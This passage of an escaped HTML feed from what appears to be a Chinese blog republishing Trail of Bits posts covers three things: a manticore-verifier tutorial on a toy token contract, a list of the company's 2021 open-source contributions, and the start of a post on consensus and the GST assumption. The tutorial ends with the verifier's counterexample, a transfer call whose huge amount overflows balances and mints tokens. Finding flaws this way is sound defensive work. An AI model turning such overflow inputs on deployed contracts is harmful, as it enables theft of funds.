&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-solidity&#34; data-lang=&#34;solidity&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;token.sol&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;contract&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;TestToken&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Token&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;constructor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;balances&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;msg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;sender&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;10000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// 属性定义
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;crytic_test_balance&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;view&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;returns&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;bool&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;balances&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;msg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;sender&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;10000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;模拟世界&#34;&gt;模拟世界
&lt;/h2&gt;&lt;p&gt;ManticoreEVM编译合约并在完全模拟的符号化区块链中创建合约。同时创建不同的普通账户来模拟真实场景：部署者账户用于部署合约，其他账户用于探索合约并尝试破坏属性，最后可能使用不同账户来测试属性。&lt;/p&gt;
&lt;p&gt;ManticoreEVM检测高级源代码中存在的属性类型方法，并在每次符号交易组合后检查它们。如果方法返回false，则普通属性被视为失败。&lt;/p&gt;
&lt;h2 id=&#34;探索循环&#34;&gt;探索循环
&lt;/h2&gt;&lt;p&gt;部署者账户最初通过CREATE交易创建目标合约。然后manticore-verifier模拟来自合约测试者的所有可能的交错交易，直到（例如）找不到更多覆盖率。每次符号交易后，都会以属性检查账户的名义检查属性，如果发现任何问题，就会生成可复现的漏洞利用跟踪报告。像crytic_test_balance()这样的普通属性预期返回true；任何其他结果都会被报告为问题。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;manticore-verifier dapp.sol --contract TestToken
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;命令行工具&#34;&gt;命令行工具
&lt;/h2&gt;&lt;p&gt;探索的多个方面、停止条件和使用的用户账户都可以通过命令行参数修改。运行$manticore-verifier &amp;ndash;help查看完整列表。以下是运行示例：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$manticore&lt;/span&gt;-verifier dapp.sol --contract TestToken
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Owner account: 0x28e9eb58c2f5be87161a261f412a115eb85946d9&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Contract account: 0x9384027ebe35100de8ef216cb401573502017f7&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Sender_0 account: 0xad5e556d9699e9e35b3190d76f75c9bf9997533b&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# PSender account: 0xad5e556d9699e9e35b3190d76f75c9bf9997533b&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Found 1 properties: crytic_test_balance&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Exploration will stop when some of the following happens:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# * 3 human transaction sent&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# * Code coverage is greater than 100% measured on target contract&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# * No more coverage was gained in the last transaction&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# * At least 1 different properties where found to be breakable. (1 for fail fast)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# * 240 seconds pass&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Starting exploration...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Transaction 0. States: 1, RT Coverage: 0.0%, Failing properties: 0/1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Transaction 1. States: 2, RT Coverage: 60.66%, Failing properties: 0/1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Found 1/1 failing properties. Stopping exploration.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;60.66% EVM code covered 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+---------------------+------------+
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Property Named   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Status   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+---------------------+------------+
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; crytic_test_balance &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; failed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+---------------------+------------+
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Checkout testcases here:./mcore_kkgtybqb
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;发现的漏洞&#34;&gt;发现的漏洞
&lt;/h2&gt;&lt;p&gt;在我们的示例中，manticore-verifier找到了破坏指定属性的方法。当尝试转移极其大量的代币时，内部整数表示超出限制，使得发送者的储蓄可以异常增加，即凭空创造代币。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-solidity&#34; data-lang=&#34;solidity&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;transfer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;115792089237316195422001709574841237640532965826898585773776019699400460720238&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;STOP&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;结论互操作性101&#34;&gt;结论：互操作性=101%
&lt;/h2&gt;&lt;p&gt;manticore-verifier降低了符号化测试任意属性的初始成本。它还使我们的符号执行器能够更紧密地与Solidity、Echidna和slither-prop协同工作。&lt;/p&gt;
&lt;p&gt;相同的方法论也可以与我们的以太坊模糊测试器Echidna一起使用。因此，您可以编写一次属性，然后通过符号执行和模糊测试来验证它们，无需额外工作。&lt;/p&gt;
&lt;p&gt;manticore-verifier可以检查自动生成的ERC20属性。此外，我们的静态分析器slither-prop详细记录了ERC20合约应该做什么，并可以自动生成manticore-verifier可以检查的ERC20属性。&lt;/p&gt;
&lt;p&gt;所以，准备好您的合约，添加属性方法，然后随心所欲地用manticore-verifier进行测试吧。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Trail of Bits 2021开源贡献盘点：编译器加固、macOS安全监控与Python工具链升级</title>
        <link>http://localhost:1313/p/trail-of-bits-2021%E5%BC%80%E6%BA%90%E8%B4%A1%E7%8C%AE%E7%9B%98%E7%82%B9%E7%BC%96%E8%AF%91%E5%99%A8%E5%8A%A0%E5%9B%BAmacos%E5%AE%89%E5%85%A8%E7%9B%91%E6%8E%A7%E4%B8%8Epython%E5%B7%A5%E5%85%B7%E9%93%BE%E5%8D%87%E7%BA%A7/</link>
        <pubDate>Sun, 03 Aug 2025 17:39:48 +0800</pubDate>
        
        <guid>http://localhost:1313/p/trail-of-bits-2021%E5%BC%80%E6%BA%90%E8%B4%A1%E7%8C%AE%E7%9B%98%E7%82%B9%E7%BC%96%E8%AF%91%E5%99%A8%E5%8A%A0%E5%9B%BAmacos%E5%AE%89%E5%85%A8%E7%9B%91%E6%8E%A7%E4%B8%8Epython%E5%B7%A5%E5%85%B7%E9%93%BE%E5%8D%87%E7%BA%A7/</guid>
        <description>&lt;h3 id=&#34;开源使命宣言&#34;&gt;开源使命宣言
&lt;/h3&gt;&lt;p&gt;在Trail of Bits，我们以开源核心工具为荣（如algo、manticore和graphtage）。本文重点不在于我们的工具，而是我们在外部项目中的贡献——2021年，团队提交的190多个PR被非自有仓库合并，体现了我们对整个软件生态安全的承诺。&lt;/p&gt;
&lt;h3 id=&#34;关键技术贡献&#34;&gt;关键技术贡献
&lt;/h3&gt;&lt;h4 id=&#34;llvm编译器基础设施&#34;&gt;LLVM编译器基础设施
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;作为clang/rustc/swiftc的后端，我们修复了包括：
&lt;ul&gt;
&lt;li&gt;修正clang AST dump模式的JSON输出有效性&lt;/li&gt;
&lt;li&gt;强化bitcode格式校验&lt;/li&gt;
&lt;li&gt;文档错误修正&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;nixpkgs软件集合&#34;&gt;Nixpkgs软件集合
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;对80,000+软件包的改进：
&lt;ul&gt;
&lt;li&gt;Go/Protobuf/SBV等核心包修复&lt;/li&gt;
&lt;li&gt;libff在ARM架构的构建修复&lt;/li&gt;
&lt;li&gt;Haskell工具链hevm的兼容性修正&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;osquery系统监控框架&#34;&gt;Osquery系统监控框架
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;macOS深度集成：
&lt;ul&gt;
&lt;li&gt;基于Endpoint Security API实现进程事件监控&lt;/li&gt;
&lt;li&gt;全面重构代码签名与CI系统&lt;/li&gt;
&lt;li&gt;原生支持Apple Silicon（ARM架构）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;安全增强：
&lt;ul&gt;
&lt;li&gt;禁用TLS 1.0/1.1&lt;/li&gt;
&lt;li&gt;OpenSSL升级至1.1.1k&lt;/li&gt;
&lt;li&gt;修复Windows SID API内存泄漏&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;python工具链生态&#34;&gt;Python工具链生态
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;关键包增强：
&lt;ul&gt;
&lt;li&gt;pyelftools新增DWARFv5支持&lt;/li&gt;
&lt;li&gt;pip-api增加全局包过滤功能&lt;/li&gt;
&lt;li&gt;Warehouse漏洞响应文档完善&lt;/li&gt;
&lt;li&gt;mypy类型系统改进&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;调试工具pwndbg&#34;&gt;调试工具Pwndbg
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;GDB插件优化：
&lt;ul&gt;
&lt;li&gt;匿名内存页映射显示&lt;/li&gt;
&lt;li&gt;命令解析器重构&lt;/li&gt;
&lt;li&gt;缓存调试机制改进&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;完整贡献清单精选&#34;&gt;完整贡献清单（精选）
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;1.&lt;/span&gt; LLVM
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;k&#34;&gt;-&lt;/span&gt; [BitcodeReader] 修复向量类型校验逻辑错误 (D109655)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;k&#34;&gt;-&lt;/span&gt; [clang] 修正带过滤器的JSON AST输出 (D108441)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;2.&lt;/span&gt; Osquery
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;k&#34;&gt;-&lt;/span&gt; 进程事件监控 (&lt;span class=&#34;ni&#34;&gt;#7046&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;k&#34;&gt;-&lt;/span&gt; Apple Silicon支持 (&lt;span class=&#34;ni&#34;&gt;#7330&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;k&#34;&gt;-&lt;/span&gt; OpenSSL 1.1.1l升级 (&lt;span class=&#34;ni&#34;&gt;#7293&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;3.&lt;/span&gt; Python生态
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;k&#34;&gt;-&lt;/span&gt; pyelftools DWARFv5支持 (&lt;span class=&#34;ni&#34;&gt;#363&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;k&#34;&gt;-&lt;/span&gt; pip-api URL需求解析 (&lt;span class=&#34;ni&#34;&gt;#109&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;4.&lt;/span&gt; 其他
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;k&#34;&gt;-&lt;/span&gt; rust-clippy新增格式字符串检测 (&lt;span class=&#34;ni&#34;&gt;#7743&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;k&#34;&gt;-&lt;/span&gt; Solana虚拟机溢出修复 (&lt;span class=&#34;ni&#34;&gt;#212&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;开源协作哲学&#34;&gt;开源协作哲学
&lt;/h3&gt;&lt;p&gt;我们深知PR提交只是开源协作的起点：代码审查、长期维护和测试覆盖同样重要。这些贡献既源于技术热爱，也因这些项目切实推动了行业进步。在此向开源社区致以诚挚谢意，祝2022年高效安全！&lt;/p&gt;
</description>
        </item>
        <item>
        <title>共识协议中的全局稳定时间(GST)假设及其实际意义</title>
        <link>http://localhost:1313/p/%E5%85%B1%E8%AF%86%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%85%A8%E5%B1%80%E7%A8%B3%E5%AE%9A%E6%97%B6%E9%97%B4gst%E5%81%87%E8%AE%BE%E5%8F%8A%E5%85%B6%E5%AE%9E%E9%99%85%E6%84%8F%E4%B9%89/</link>
        <pubDate>Sun, 03 Aug 2025 17:23:21 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%85%B1%E8%AF%86%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%85%A8%E5%B1%80%E7%A8%B3%E5%AE%9A%E6%97%B6%E9%97%B4gst%E5%81%87%E8%AE%BE%E5%8F%8A%E5%85%B6%E5%AE%9E%E9%99%85%E6%84%8F%E4%B9%89/</guid>
        <description>&lt;h1 id=&#34;激励全局稳定性---trail-of-bits博客&#34;&gt;激励全局稳定性 - Trail of Bits博客
&lt;/h1&gt;&lt;p&gt;共识协议在许多应用中扮演着关键角色。Fischer、Lynch和Paterson的经典不可能性结果表明，在合理假设下，协议可能无法达成共识。Dwork、Lynch和Stockmeyer的论文《部分同步环境下的共识》(DLS论文)通过引入以下&amp;quot;全局稳定时间&amp;quot;(GST)假设规避了这一不可能性结果：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;对于每次执行，都存在一个处理器不知道的全局稳定时间(GST)，从GST开始消息系统将遵守上限Δ。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;换句话说，GST是一个时间点，此后所有网络消息的延迟最多为Δ。DLS表明，在这一假设下，可以构建保证达成共识的协议。&lt;/p&gt;
&lt;h2 id=&#34;flp不可能性结果&#34;&gt;FLP不可能性结果
&lt;/h2&gt;&lt;p&gt;在《一个故障进程下分布式共识的不可能性》中，Fischer、Lynch和Paterson证明，在非常温和的假设下，一组进程可能无法达成共识。这被称为FLP不可能性结果。&lt;/p&gt;
&lt;h3 id=&#34;模型&#34;&gt;模型
&lt;/h3&gt;&lt;p&gt;在FLP模型中，两个或多个进程交换消息以尝试就值(0或1)达成一致。每个进程都有一个一次性写入的输出寄存器。进程达成共识的条件是至少一个进程将值写入其输出寄存器，且没有其他进程将相反值写入自己的输出寄存器。&lt;/p&gt;
&lt;p&gt;配置包括所有进程的内部状态(包括输出寄存器)以及已发送但尚未传递的所有消息。事件e是(p,m)对，包含消息m和接收进程p。&lt;/p&gt;
&lt;h3 id=&#34;证明思路&#34;&gt;证明思路
&lt;/h3&gt;&lt;p&gt;考虑作者的核心引理：如果C是一个二价配置(可能决定0或1)，e是在C中可传递的事件，那么可以以导致二价配置的方式传递e。使用这个引理，作者表明可以以永远无法达成共识的方式传递所有消息。&lt;/p&gt;
&lt;h2 id=&#34;限制对手&#34;&gt;限制对手
